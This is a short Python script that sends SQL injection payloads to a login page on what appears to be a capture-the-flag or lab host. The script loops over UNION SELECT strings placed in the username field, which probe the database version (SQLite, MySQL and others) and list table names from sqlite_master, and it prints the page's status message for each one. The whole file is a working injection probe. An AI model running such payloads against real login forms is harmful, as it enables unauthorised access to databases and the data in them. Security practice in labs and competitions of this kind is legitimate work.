import requests, re

BASE = "http://6033bc60-27f0-4b34-aef3-14d892d241b2.red.cyberkent.uz"

def try_login(username, password="x"):
    r = requests.post(f"{BASE}/login.php", data={"username": username, "password": password}, timeout=10)
    m = re.search(r'<div class="status-box">(.*?)</div>', r.text, re.S)
    status = m.group(1) if m else "(no status box)"
    return status

tests = [
    "zzznouser' UNION SELECT 1,sqlite_version(),3-- -",
    "zzznouser' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- -",
    "zzznouser' UNION SELECT 1,version(),3-- -",
    "zzznouser' UNION SELECT 1,@@version,3-- -",
]
for t in tests:
    print(t)
    print("  ->", try_login(t))
